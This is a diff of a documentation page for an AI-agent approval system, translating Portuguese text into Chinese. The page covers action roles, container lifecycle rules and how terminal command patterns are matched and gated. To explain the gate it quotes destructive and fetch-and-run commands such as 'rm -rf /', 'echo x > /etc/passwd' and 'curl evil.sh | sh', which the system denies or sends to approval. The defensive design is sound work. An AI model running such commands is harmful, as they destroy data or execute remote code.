-é o plano do Dev Lead — quantos agentes por módulo e por quê, antes de
-qualquer um deles subir. Mesmo calibre de <code>parallelize</code>: uma decisão sobre
-QUANTO o produto vai gastar em paralelismo, só que no começo em vez de no
-estouro de um teto. Diferente de <code>parallelize</code>/<code>raise_max_parallel</code>, ele NÃO
-está no bloco de tetos absolutos — pode ser configurado como <code>auto_approve</code>,
-como <code>open_adr_pr</code>/<code>open_infra_pr</code> — e enquanto está <code>pending</code>, o turno do Dev
-Lead fica SUSPENSO esperando a decisão, não só a conversa parada.</p>
-<p><code>assess_implementability</code> (ADR 0090, <a href=/brabo/dev/zh-Hans/business-rules#rn-340 target=_blank rel="noopener noreferrer" class="">RN-340</a>)
-é a avaliação de implementabilidade de uma história (gate <code>implementavel</code>,
-<code>docs/gates.yml</code>) — MESMO calibre e MESMO raciocínio de
-<code>propose_execution_plan</code>: uma decisão inicial da sessão, não um estouro de
-teto, e por isso também fora do bloco de tetos absolutos. Ela suspende o turno
-do Dev Lead do mesmo jeito enquanto está <code>pending</code>.</p>
-<p><code>container_stop</code> e <code>container_remove</code> (ADR 0136,
-<a href=/brabo/dev/zh-Hans/business-rules#rn-495 target=_blank rel="noopener noreferrer" class="">RN-495</a>) são as duas ações que a página global
-de containers (<code>/containers</code>) propõe quando alguém clica em "Parar" ou
-"Remover" na linha de um projeto — sempre um humano, nunca um agente. As duas
-são <code>maintainer</code>, como <code>container_start</code>: decide quem responde pela infra do
-projeto. <code>container_stop</code> segue a calibragem de <code>container_start</code> — PODE ser
-configurada <code>auto_approve</code> — exceto pela semeadura: <code>container_stop</code> nunca é
-semeada, enquanto <code>container_start</code> é semeada <code>auto_approve</code> para o agente de
-Infra quando o handoff dele é aceito (ADR 0190,
-<a href=/brabo/dev/zh-Hans/business-rules#rn-671 target=_blank rel="noopener noreferrer" class="">RN-671</a>). É essa semeadura que deixa a subida
-que o SERVIDOR do Infra Lead propõe nesse aceite rodar sem um segundo clique;
-o mínimo <code>maintainer</code>, as recusas por modo/estado e o 409 sem broker continuam
-valendo antes dela.
-<code>container_remove</code> não pode: ela descarta o container e força um
-reprovisionamento completo, e está no bloco de tetos absolutos abaixo, mesmo
-tratamento de git com efeito externo/comandos privilegiados.</p>
-<p><strong>Nenhuma das três se importa com ONDE o container sobe.</strong> <code>decide()</code> e todas
-as regras acima ignoram o <code>executionMode</code> — a ramificação só existe na
-EXECUÇÃO, depois da aprovação (<code>ExecuteContainerStartUseCase</code>/
-<code>ExecuteContainerStopUseCase</code>/<code>ExecuteContainerRemoveUseCase</code>): a ação
-aprovada de um projeto <code>container</code> continua indo para o broker
-(<code>ContainerBrokerPort</code>, sem mudança); a de um projeto <code>mounted</code>/<code>runner</code> vai,
-em vez disso, para o RUNNER conectado ao projeto, pelo canal Phoenix que ele
-já mantém (<a href=/brabo/dev/zh-Hans/business-rules#rn-497 target=_blank rel="noopener noreferrer" class="">RN-497</a>,
-<a href=/brabo/dev/zh-Hans/adr/0137-o-runner-sobe-o-container-do-projeto target=_blank rel="noopener noreferrer" class="">ADR 0137</a>). "Nenhum
-runner conectado" e "o runner tentou e recusou" são os dois desfechos <code>failed</code>
-comuns, mesma disciplina de uma recusa do broker — nunca uma exceção não
-tratada.</p>
-<p><strong>Mais uma coisa acontece na execução de <code>container_start</code>, e só em
-<code>mounted</code></strong> (<a href=/brabo/dev/zh-Hans/business-rules#rn-501 target=_blank rel="noopener noreferrer" class="">RN-501</a>,
-<a href=/brabo/dev/zh-Hans/adr/0142-validacao-de-workspace-montado-adiada target=_blank rel="noopener noreferrer" class="">ADR 0142</a>): a pasta do
-projeto é MATERIALIZADA ali. Criar um projeto <code>mounted</code> não exige mais que a
-pasta exista — a criação valida só o formato do caminho mais a
-<code>BRABO_PROJECTS_BASE</code> — porque o requisito do dono do produto é que o
-bind-mount seja criado DEPOIS da decisão do Arquiteto, e <code>container_start</code> é o
-primeiro momento que se qualifica. Então o executor faz <code>mkdir -p</code> da pasta,
-prova que ela é gravável de dentro da api e carimba <code>workspace_verified_at</code>,
-tudo ANTES de qualquer transição de ciclo de vida. Uma pasta que a api não
-consegue criar ou alcançar é um <code>failed</code> NOMEADO — nomeia a variável, o
-caminho, a causa provável (dono da pasta no host; as imagens rodam
-non-root, ADR 0024) e o próximo passo — e a linha do ciclo de vida <strong>não</strong> é
-marcada <code>provisioning</code>: marcá-la e só então descobrir que não dá para escrever
-deixaria <code>project_containers</code> afirmando um estado que nunca existiu. Nada disso
-toca <code>decide()</code>, os tetos ou quem pode aprovar.</p>
-<p><strong>E <code>container_start</code> resolve os recursos dele ali</strong>
-(<a href=/brabo/dev/zh-Hans/business-rules#rn-683 target=_blank rel="noopener noreferrer" class="">RN-683</a>,
-<a href=/brabo/dev/zh-Hans/adr/0199-recurso-minimo-derivado-do-module-map target=_blank rel="noopener noreferrer" class="">ADR 0199</a>): um campo
-que a proposta OMITE — todos, na subida do servidor no aceite do handoff —
-vira o MÍNIMO derivado do <code>module_map</code> vigente (a soma do que cada módulo
-declarou, com piso no padrão de hoje enquanto algum módulo não declarou nada);
-um campo ABAIXO desse mínimo é um <code>failed</code> nomeado, gravado antes de qualquer
-decisão de imagem ou transição de ciclo de vida; acima dele, vale o teto de
-sempre. Como a materialização da pasta, isto é execução, não política:
-<code>decide()</code> e quem pode aprovar não mudam.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=como-um-padrão-casa-com-um-comando>Como um padrão casa com um comando<a href=#como-um-padrão-casa-com-um-comando class=hash-link aria-label="Como um padrão casa com um comando的直接链接" title="Como um padrão casa com um comando的直接链接" translate=no>​</a></h2>
-<p>Não por substring. O comando é tokenizado com as regras do shell e o padrão
-casa por <strong>prefixo de token</strong>:</p>
+<table><thead><tr><th>动作类型<th>标签<th>最低角色<tbody><tr><td><code>terminal</code><td><code>Terminal</code><td>developer<tr><td><code>git_commit</code><td><code>GitCommit</code><td>developer<tr><td><code>write_file</code><td><code>WriteFile</code><td>developer<tr><td><code>git_push</code><td><code>GitPush</code><td>maintainer<tr><td><code>pr_open</code><td><code>PrOpen</code><td>maintainer<tr><td><code>git_repo_create</code><td><code>GitRepoCreate</code><td>maintainer<tr><td><code>git_branch_create</code><td><code>GitBranchCreate</code><td>maintainer<tr><td><code>git_branch_protect</code><td><code>GitBranchProtect</code><td>maintainer<tr><td><code>open_adr_pr</code><td><code>OpenAdrPr</code><td>maintainer<tr><td><code>open_infra_pr</code><td><code>OpenInfraPr</code><td>maintainer<tr><td><code>git_merge</code><td><code>GitMerge</code><td>maintainer<tr><td><code>instruction_patch</code><td><code>InstructionPatch</code><td>maintainer<tr><td><code>parallelize</code><td><code>Parallelize</code><td>maintainer<tr><td><code>raise_max_parallel</code><td><code>RaiseMaxParallel</code><td>maintainer<tr><td><code>propose_execution_plan</code><td><code>ProposeExecutionPlan</code><td>maintainer<tr><td><code>assess_implementability</code><td><code>AssessImplementability</code><td>maintainer<tr><td><code>container_start</code><td><code>ContainerStart</code><td>maintainer<tr><td><code>container_stop</code><td><code>ContainerStop</code><td>maintainer<tr><td><code>container_remove</code><td><code>ContainerRemove</code><td>maintainer<tr><td><code>spend</code><td><code>Spend</code><td><strong>owner</strong></table>
+<p>最低角色在文件<strong>之前</strong>检查。达不到则 <code>deny</code>——
+<code>permissions.json</code> 不会授予 IAM 拒绝的东西</p>
+<p><code>parallelize</code>（Fase 14d）是唯一一个效果不是触及代码或仓库的：它请求更多<strong>agent</strong>。它是 <code>maintainer</code>，理由与
+<code>spend</code> 相同——授权成本的人是对项目负责的人。它只存在于 lead 的上限之上；在上限之内没有动作，因为没有什么需要决定
+（<a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-083>RN-083</a>）
+（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-005>RN-005</a>）。</p>
+<p><code>propose_execution_plan</code>（ADR 0086，<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-284>RN-284</a>）
+是 Dev Lead 的计划——每个模块多少个 agent 以及为什么，在任何一个启动之前。与 <code>parallelize</code> 同一量级：关于产品将在并行上花费<strong>多少</strong>的决定，只不过是在开始时而不是在超出上限时。与 <code>parallelize</code>/<code>raise_max_parallel</code> 不同，它<strong>不</strong>在绝对上限块中——可以配置为 <code>auto_approve</code>，
+与 <code>open_adr_pr</code>/<code>open_infra_pr</code> 一样——而在它处于 <code>pending</code> 期间，Dev
+Lead 的轮次被<strong>挂起</strong>等待决定，而不只是对话停住。</p>
+<p><code>assess_implementability</code>（ADR 0090，<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-340>RN-340</a>）
+是对一个故事可实现性的评估（gate <code>implementavel</code>，
+<code>docs/gates.yml</code>）——与 <code>propose_execution_plan</code> <strong>同一</strong>量级、<strong>同一</strong>理由：会话的初始决定，而非超出上限，因此同样不在绝对上限块中。它在 <code>pending</code> 期间以同样方式挂起 Dev Lead 的轮次。</p>
+<p><code>container_stop</code> 和 <code>container_remove</code>（ADR 0136，
+<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-495>RN-495</a>）是全局容器页面
+（<code>/containers</code>）在有人点击项目行上的“停止”或“移除”时提出的两个动作——总是人，从不是 agent。两者都是
+<code>maintainer</code>，与 <code>container_start</code> 一样：由对项目基础设施负责的人决定。<code>container_stop</code> 沿用 <code>container_start</code> 的校准——<strong>可以</strong>配置为 <code>auto_approve</code>——除了预置：<code>container_stop</code> 从不被预置，而 <code>container_start</code> 在 Infra agent 的 handoff 被接受时为它预置为 <code>auto_approve</code>（ADR 0190，
+<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-671>RN-671</a>）。正是这个预置让 Infra Lead 的<strong>服务器</strong>在该接受时提出的启动无需第二次点击即可运行；
+最低 <code>maintainer</code>、按模式/状态的拒绝以及无 broker 时的 409 仍在它之前生效。
+<code>container_remove</code> 不行：它丢弃容器并强制完全重新配置，位于下方的绝对上限块中，与有外部效果的 git/特权命令同等对待。</p>
+<p><strong>三者都不关心容器在哪里启动。</strong> <code>decide()</code> 和上面所有规则都忽略 <code>executionMode</code>——分支只存在于批准之后的<strong>执行</strong>中（<code>ExecuteContainerStartUseCase</code>/
+<code>ExecuteContainerStopUseCase</code>/<code>ExecuteContainerRemoveUseCase</code>）：<code>container</code> 项目被批准的动作仍然发往 broker
+（<code>ContainerBrokerPort</code>，无变化）；<code>mounted</code>/<code>runner</code> 项目的则改为发往连接到该项目的 <strong>RUNNER</strong>，经由它已维持的 Phoenix 通道（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-497>RN-497</a>，
+<a class="" href=/brabo/dev/zh-Hans/adr/0137-o-runner-sobe-o-container-do-projeto>ADR 0137</a>）。“没有连接的 runner”和“runner 尝试了并拒绝”是两种常见的 <code>failed</code> 结果，与 broker 拒绝同一纪律——绝不是未处理的异常。</p>
+<p><strong><code>container_start</code> 的执行中还会发生一件事，且只在 <code>mounted</code> 中</strong>（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-501>RN-501</a>，
+<a class="" href=/brabo/dev/zh-Hans/adr/0142-validacao-de-workspace-montado-adiada>ADR 0142</a>）：项目文件夹在那里被<strong>实体化</strong>。创建 <code>mounted</code> 项目不再要求文件夹存在——创建只校验路径格式以及
+<code>BRABO_PROJECTS_BASE</code>——因为产品负责人的要求是 bind-mount 在架构师的决定<strong>之后</strong>创建，而 <code>container_start</code> 是第一个符合条件的时刻。于是执行器对文件夹执行 <code>mkdir -p</code>，证明它在 api 内部可写，并盖上 <code>workspace_verified_at</code>，全部在任何生命周期转换<strong>之前</strong>。api 无法创建或访问的文件夹是一个<strong>有名字的</strong> <code>failed</code>——点名变量、路径、可能原因（主机上文件夹的所有者；镜像以 non-root 运行，ADR 0024）和下一步——而生命周期那一行<strong>不会</strong>被标记为 <code>provisioning</code>：先标记再发现无法写入，会让 <code>project_containers</code> 断言一个从未存在的状态。这些都不触及 <code>decide()</code>、上限或谁能批准。</p>
+<p><strong>而 <code>container_start</code> 也在那里解析自己的资源</strong>
+（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-683>RN-683</a>，
+<a class="" href=/brabo/dev/zh-Hans/adr/0199-recurso-minimo-derivado-do-module-map>ADR 0199</a>）：提案<strong>省略</strong>的字段——在 handoff 接受时服务器启动的情况下是全部字段——变成从现行 <code>module_map</code> 派生的<strong>最小值</strong>（每个模块声明的总和，在仍有模块什么都没声明时以今天的默认值为下限）；<strong>低于</strong>该最小值的字段是一个有名字的 <code>failed</code>，在任何镜像决定或生命周期转换之前写入；高于它，则适用一贯的上限。与文件夹的实体化一样，这是执行，不是策略：
+<code>decide()</code> 和谁能批准都不变。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=模式如何匹配命令>模式如何匹配命令<a href=#模式如何匹配命令 class=hash-link aria-label=模式如何匹配命令的直接链接 title=模式如何匹配命令的直接链接 translate=no>​</a></h2>
+<p>不是按子串。命令按 shell 规则分词，模式按<strong>词元前缀</strong>匹配：</p>
 
 
 
@@ -276,334 +218,163 @@ casa por <strong>prefixo de token</strong>:</p>
 
 
 
-<table><thead><tr><th>padrão<th>comando<th>casa?<tbody><tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test</code><td>✅<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test --watch</code><td>✅ (prefixo)<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm build</code><td>❌<tr><td><code>Terminal(pnpm test:*)</code><td><code>pnpm test:unit</code><td>✅ (<code>*</code> no fim do token)<tr><td><code>Terminal(rm)</code><td><code>sudo rm -rf x</code><td>❌ — <code>rm</code> não é o primeiro token</table>
-<p>O <code>*</code> vale <strong>dentro de um token</strong>, no fim. Não é glob de caminho:
-<code>Terminal(rm -rf /*)</code> casa com o token literal <code>/*</code>, não com "qualquer coisa
-abaixo de <code>/</code>".</p>
-<p>Variáveis de ambiente são preservadas literalmente: <code>$HOME</code> continua <code>$HOME</code>
-no casamento, em vez de expandir para vazio — expandir mudaria em silêncio o
-que está sendo comparado.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=comando-composto>Comando composto<a href=#comando-composto class=hash-link aria-label="Comando composto的直接链接" title="Comando composto的直接链接" translate=no>​</a></h2>
-<p>Um comando com <code>&&</code>, <code>;</code>, <code>|</code>, <code>||</code> ou <code>&</code> é dividido em segmentos, e <strong>cada
-segmento é avaliado separadamente</strong>:</p>
+<table><thead><tr><th>模式<th>命令<th>匹配？<tbody><tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test</code><td>✅<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test --watch</code><td>✅（前缀）<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm build</code><td>❌<tr><td><code>Terminal(pnpm test:*)</code><td><code>pnpm test:unit</code><td>✅（<code>*</code> 在词元末尾）<tr><td><code>Terminal(rm)</code><td><code>sudo rm -rf x</code><td>❌ — <code>rm</code> 不是第一个词元</table>
+<p><code>*</code> 只在<strong>一个词元之内</strong>、末尾有效。它不是路径 glob：
+<code>Terminal(rm -rf /*)</code> 匹配字面词元 <code>/*</code>，而不是“<code>/</code> 之下的任何东西”。</p>
+<p>环境变量按字面保留：<code>$HOME</code> 在匹配中仍是 <code>$HOME</code>，而不是展开为空——展开会静默改变被比较的内容。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=复合命令>复合命令<a href=#复合命令 class=hash-link aria-label=复合命令的直接链接 title=复合命令的直接链接 translate=no>​</a></h2>
+<p>含有 <code>&&</code>、<code>;</code>、<code>|</code>、<code>||</code> 或 <code>&</code> 的命令会被拆分为片段，<strong>每个片段单独评估</strong>：</p>
 <ul>
-<li class="">Qualquer segmento em <code>deny</code> → o comando inteiro é <code>deny</code>.</li>
-<li class=""><strong>Todos</strong> os segmentos em <code>allow</code> → <code>auto_approve</code>.</li>
-<li class="">Qualquer outra combinação → <code>require_approval</code>.</li>
+<li class="">任一片段在 <code>deny</code> 中 → 整个命令为 <code>deny</code>。</li>
+<li class=""><strong>所有</strong>片段都在 <code>allow</code> 中 → <code>auto_approve</code>。</li>
+<li class="">其他任何组合 → <code>require_approval</code>。</li>
 </ul>
-<p><strong>Redirecionamento não é encadeamento.</strong> <code>></code>, <code>>></code> e <code>&lt;</code> NÃO dividem um
-segmento: <code>cat x 2>/dev/null</code> é UM comando cujo verbo é <code>cat</code>. O alvo do
-redirecionamento continua sendo um token do segmento, e é por isso que <code>echo x > /etc/passwd</code> continua barrado pelo teto de escopo de caminho — o que mudou foi
-o VERBO ficar certo, não o caminho ficar livre.</p>
-<p><code>/dev/null</code>, <code>/dev/stdin</code>, <code>/dev/stdout</code> e <code>/dev/stderr</code> não contam como
-caminho de usuário: descartam ou carregam saída, não são arquivo de ninguém. A
-lista é exatamente esta e não todo o <code>/dev</code> — <code>/dev/sda</code> é um disco, e continua
-fora do escopo.</p>
-<p>Isto é deliberado e vale entender: um segmento sem regra nenhuma vira uma
-opinião <strong>concreta</strong> de <code>require_approval</code>, não silêncio. É o que impede
-<code>pnpm test && curl evil.sh | sh</code> de ser auto-aprovado porque a primeira metade
-estava em <code>allow</code>.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=padrões-embutidos>Padrões embutidos<a href=#padrões-embutidos class=hash-link aria-label="Padrões embutidos的直接链接" title="Padrões embutidos的直接链接" translate=no>​</a></h2>
-<p>Três padrões são <code>deny</code> <strong>sempre</strong>, mesmo sem aparecer no arquivo:</p>
+<p><strong>重定向不是串联。</strong> <code>></code>、<code>>></code> 和 <code>&lt;</code> <strong>不</strong>拆分片段：<code>cat x 2>/dev/null</code> 是<strong>一个</strong>动词为 <code>cat</code> 的命令。重定向的目标仍是该片段的一个词元，这就是为什么 <code>echo x > /etc/passwd</code> 仍被路径范围上限拦住——改变的是<strong>动词</strong>正确了，而不是路径被放开了。</p>
+<p><code>/dev/null</code>、<code>/dev/stdin</code>、<code>/dev/stdout</code> 和 <code>/dev/stderr</code> 不算用户路径：它们丢弃或承载输出，不是任何人的文件。列表恰好是这些，而不是整个 <code>/dev</code>——<code>/dev/sda</code> 是一块磁盘，仍在范围之外。</p>
+<p>这是有意为之，值得理解：一个没有任何规则的片段会变成一个<strong>具体的</strong> <code>require_approval</code> 意见，而不是沉默。正是这一点阻止了
+<code>pnpm test && curl evil.sh | sh</code> 因为前半部分在 <code>allow</code> 中而被自动批准。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=内置模式>内置模式<a href=#内置模式 class=hash-link aria-label=内置模式的直接链接 title=内置模式的直接链接 translate=no>​</a></h2>
+<p>三个模式<strong>始终</strong>是 <code>deny</code>，即使没有出现在文件中：</p>
 <div class="language-text codeBlockContainer_Vzt9 theme-code-block" style=--prism-color:var(--syntax-text);--prism-background-color:var(--code-bg)><div class=codeBlockContent_FxwE><pre tabindex=0 class="prism-code language-text codeBlock_mqej thin-scrollbar" style=color:var(--syntax-text);background-color:var(--code-bg)><code class=codeBlockLines_uNqR><div class=token-line style=color:var(--syntax-text)><span class="token plain">Terminal(rm -rf /)</span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">Terminal(rm -rf /*)</span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">Terminal(rm -fr /)</span><br/></div></code></pre></div></div>
-<p>Eles não são uma lista de segurança abrangente — são um piso. A proteção real
-vem de o <code>allow</code> ser explícito e todo o resto cair em aprovação.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-que-a-ativação-da-execução-semeia>O que a ativação da execução semeia<a href=#o-que-a-ativação-da-execução-semeia class=hash-link aria-label="O que a ativação da execução semeia的直接链接" title="O que a ativação da execução semeia的直接链接" translate=no>​</a></h2>
-<p>Ativar a execução grava os padrões de <code>DEV_TERMINAL_ALLOW_PATTERNS</code>
-(<code>apps/api/src/domain/actions/dev-terminal-patterns.ts</code>) no <code>allow</code> do
-projeto. São duas famílias:</p>
+<p>它们不是一份全面的安全清单——它们是一个下限。真正的保护来自 <code>allow</code> 是显式的，而其余一切都进入审批。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=激活执行时预置什么>激活执行时预置什么<a href=#激活执行时预置什么 class=hash-link aria-label=激活执行时预置什么的直接链接 title=激活执行时预置什么的直接链接 translate=no>​</a></h2>
+<p>激活执行会把 <code>DEV_TERMINAL_ALLOW_PATTERNS</code>
+（<code>apps/api/src/domain/actions/dev-terminal-patterns.ts</code>）中的模式写入项目的
+<code>allow</code>。有两个家族：</p>
 <ul>
-<li class=""><strong>leitura do próprio worktree</strong> — <code>ls</code>, <code>pwd</code>, <code>find</code>, <code>cat</code>, <code>head</code>,
-<code>tail</code>, <code>grep</code>, <code>wc</code>, <code>echo</code>, <code>git status</code>, <code>git diff</code>, <code>git log</code>;</li>
-<li class=""><strong>leitura de histórico/remoto/config do git</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>, <code>git remote -v</code>, <code>git remote show</code>, <code>git worktree list</code>, <code>git show</code>, <code>git for-each-ref</code>, <code>git ls-tree</code>, <code>git rev-parse</code>, <code>git config --get</code> (veja a <a href=/brabo/dev/zh-Hans/business-rules/custo#rn-143 target=_blank rel="noopener noreferrer" class="">RN-143</a>);</li>
-<li class=""><strong>build e teste</strong> — <code>pnpm install</code>, <code>pnpm test</code>, <code>npm run</code>, <code>npx vitest</code>, <code>mix test</code>, <code>pytest</code>, <code>go test</code>, <code>cargo test</code>, entre outros.</li>
+<li class=""><strong>读取自己的 worktree</strong> — <code>ls</code>、<code>pwd</code>、<code>find</code>、<code>cat</code>、<code>head</code>、
+<code>tail</code>、<code>grep</code>、<code>wc</code>、<code>echo</code>、<code>git status</code>、<code>git diff</code>、<code>git log</code>；</li>
+<li class=""><strong>读取 git 的历史/远程/配置</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>、<code>git remote -v</code>、<code>git remote show</code>、<code>git worktree list</code>、<code>git show</code>、<code>git for-each-ref</code>、<code>git ls-tree</code>、<code>git rev-parse</code>、<code>git config --get</code>（见 <a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-143>RN-143</a>）；</li>
+<li class=""><strong>构建与测试</strong> — <code>pnpm install</code>、<code>pnpm test</code>、<code>npm run</code>、<code>npx vitest</code>、<code>mix test</code>、<code>pytest</code>、<code>go test</code>、<code>cargo test</code> 等。</li>
 </ul>
-<p>A terceira família existe porque o <code>ReportDone</code> só deixa abrir PR depois de um
-<code>terminal</code> com <code>exit 0</code> no histórico. A primeira existe porque o agente
-<strong>olha antes de construir</strong>: sem ela, todo <code>ls -la</code> num repositório recém
-provisionado caía em aprovação, voltava como <code>status pending</code> — e não como a
-saída do comando — e queimava uma iteração do ToolLoop até a tarefa morrer por
-limite (veja a <a href=/brabo/dev/zh-Hans/business-rules/custo#rn-068 target=_blank rel="noopener noreferrer" class="">RN-068</a>). A segunda existe
-porque <code>git status</code>/<code>diff</code>/<code>log</code> bastam para olhar o worktree, mas não para o
-agente se orientar no histórico e nos remotos de um repositório recém adotado
-— uma sessão real gastou dezenas de aprovações manuais em subcomandos como
-<code>git branch -a</code> ou <code>git worktree list</code> que ficavam fora do <code>allow</code> e
-empurravam para aprovação manual todo comando composto em que apareciam.</p>
-<p>Isto NÃO afrouxa nada do que está descrito acima. Continua valendo que <code>deny</code>
-vence <code>allow</code>, que os padrões embutidos seguem ativos, que o casamento é por
-prefixo de <strong>token</strong> (<code>ls</code> permitido não permite <code>lsof</code>), e que um comando
-composto exige que TODO segmento case — então <code>ls && rm -rf /</code> não passa por
-causa do <code>ls</code>.</p>
-<p>A segunda família exige cuidado a mais, porque o casamento por prefixo permite
-QUALQUER coisa depois do prefixo que casou: um padrão nu <code>Terminal(git branch)</code> casaria tanto com <code>git branch -D nome</code> (apaga) quanto com <code>git branch nome-nova</code> (cria) além da listagem simples, porque não enxerga o que vem
-depois. Por isso <code>branch</code>, <code>remote</code>, <code>worktree</code> e <code>config</code> — os quatro que têm
-um irmão que MUTA — só entraram ANCORADOS pela flag que torna a leitura
-inequívoca (<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>), nunca pelo verbo nu;
-<code>git branch -D/-d/-m/-M</code>, <code>git remote add/remove/set-url</code>,
-<code>git worktree add/remove/prune</code> e <code>git config &lt;chave> &lt;valor></code> (sem <code>--get</code>)
-continuam exigindo aprovação. <code>show</code>, <code>log</code>, <code>for-each-ref</code>, <code>ls-tree</code> e
-<code>rev-parse</code> não precisaram de âncora: nenhuma continuação deles muta o
-repositório.</p>
-<p>Auto-aprovar <code>terminal</code> via <code>agent_autonomy</code> seria diferente e não é o que se
-faz: liberaria QUALQUER comando dentro do container do engine, sem arquivo no
-meio.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=a-ordem-completa-da-decisão>A ordem completa da decisão<a href=#a-ordem-completa-da-decisão class=hash-link aria-label="A ordem completa da decisão的直接链接" title="A ordem completa da decisão的直接链接" translate=no>​</a></h2>
+<p>第三个家族存在，是因为 <code>ReportDone</code> 只在历史中有一个 <code>exit 0</code> 的
+<code>terminal</code> 之后才允许开 PR。第一个家族存在，是因为 agent <strong>先看再构建</strong>：没有它，在刚配置好的仓库里每个 <code>ls -la</code> 都会进入审批，以 <code>status pending</code> 返回——而不是命令的输出——并烧掉 ToolLoop 的一次迭代，直到任务因上限而死（见 <a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-068>RN-068</a>）。第二个家族存在，是因为 <code>git status</code>/<code>diff</code>/<code>log</code> 足以查看 worktree，却不足以让 agent 在一个刚被采用的仓库的历史和远程中找到方向——一次真实会话在 <code>git branch -a</code> 或 <code>git worktree list</code> 这类子命令上花了几十次手动审批，它们不在 <code>allow</code> 中，并把它们出现的每个复合命令都推向手动审批。</p>
+<p>这<strong>不会</strong>放松上面描述的任何东西。依然成立：<code>deny</code> 胜过 <code>allow</code>，内置模式仍然有效，匹配按<strong>词元</strong>前缀（允许 <code>ls</code> 不等于允许 <code>lsof</code>），复合命令要求<strong>每个</strong>片段都匹配——所以 <code>ls && rm -rf /</code> 不会因为 <code>ls</code> 而通过。</p>
+<p>第二个家族需要额外小心，因为前缀匹配允许匹配前缀之后的<strong>任何</strong>东西：一个裸的 <code>Terminal(git branch)</code> 模式除了简单列出之外，还会同时匹配 <code>git branch -D nome</code>（删除）和 <code>git branch nome-nova</code>（创建），因为它看不到后面跟着什么。因此 <code>branch</code>、<code>remote</code>、<code>worktree</code> 和 <code>config</code>——四个拥有会<strong>变更</strong>的兄弟命令的——只以能让读取无歧义的 flag 作为<strong>锚点</strong>加入（<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>），绝不以裸动词加入；
+<code>git branch -D/-d/-m/-M</code>、<code>git remote add/remove/set-url</code>、
+<code>git worktree add/remove/prune</code> 和 <code>git config &lt;chave> &lt;valor></code>（无 <code>--get</code>）仍需审批。<code>show</code>、<code>log</code>、<code>for-each-ref</code>、<code>ls-tree</code> 和
+<code>rev-parse</code> 不需要锚点：它们的任何后续都不会变更仓库。</p>
+<p>通过 <code>agent_autonomy</code> 自动批准 <code>terminal</code> 是另一回事，也不是这里的做法：它会放行 engine 容器内的<strong>任何</strong>命令，中间没有文件。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=决策的完整顺序>决策的完整顺序<a href=#决策的完整顺序 class=hash-link aria-label=决策的完整顺序的直接链接 title=决策的完整顺序的直接链接 translate=no>​</a></h2>
 <!-- -->
-<p><strong>O nó <code>Z</code> mudou de posição</strong> (<a href=/brabo/dev/zh-Hans/business-rules#rn-418 target=_blank rel="noopener noreferrer" class="">RN-418</a>, revisa
-a <a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-106 target=_blank rel="noopener noreferrer" class="">RN-106</a>): até a chegada do
-runner local, ele ficava logo depois do IAM e devolvia <code>deny</code> — agora é um
-TETO, no mesmo bloco final dos outros três, aplicado depois de
-<code>agent_autonomy</code> e <code>permissions.json</code> já terem opinado. Veja a seção
-<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="">"A fronteira de efeito externo e comando privilegiado"</a>
-abaixo para o porquê.</p>
-<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=modo-automático-a-curinga-do-agent_autonomy-rn-153>"Modo automático": a curinga do <code>agent_autonomy</code> (<a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-153 target=_blank rel="noopener noreferrer" class="">RN-153</a>)<a href=#modo-automático-a-curinga-do-agent_autonomy-rn-153 class=hash-link aria-label=modo-automático-a-curinga-do-agent_autonomy-rn-153的直接链接 title=modo-automático-a-curinga-do-agent_autonomy-rn-153的直接链接 translate=no>​</a></h3>
-<p>O nó <code>agent_autonomy tem opinião?</code> do diagrama acima não sabe, e não precisa
-saber, se a opinião veio de uma regra ESPECÍFICA (<code>actionType: "terminal"</code>) ou
-da curinga <code>actionType: "*"</code> — o "modo automático": autonomia para QUALQUER
-tipo de ação daquele agente, ligada com um clique em "Modo automático" no
-<code>ApprovalCard</code>. A resolução acontece ANTES de este diagrama começar, num
-repositório só: <code>DrizzleAgentAutonomyRepository.findMode</code> procura a regra
-específica e a curinga na mesma consulta, e devolve a específica quando as duas
-existem — gravar <code>terminal: deny</code> com <code>"*": auto_approve</code> ligado continua
-negando <code>terminal</code> para aquele agente, enquanto libera o resto.</p>
-<p>Por isso o diagrama não ganhou nó novo, e os tetos, logo abaixo, valem para o
-"modo automático" porque reagem a <code>current.policy === 'auto_approve'</code>, nunca à
-origem dele (<a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-154 target=_blank rel="noopener noreferrer" class="">RN-154</a>).</p>
-<p><strong>Uma exceção, decidida pelo dono do produto: o modo automático libera o
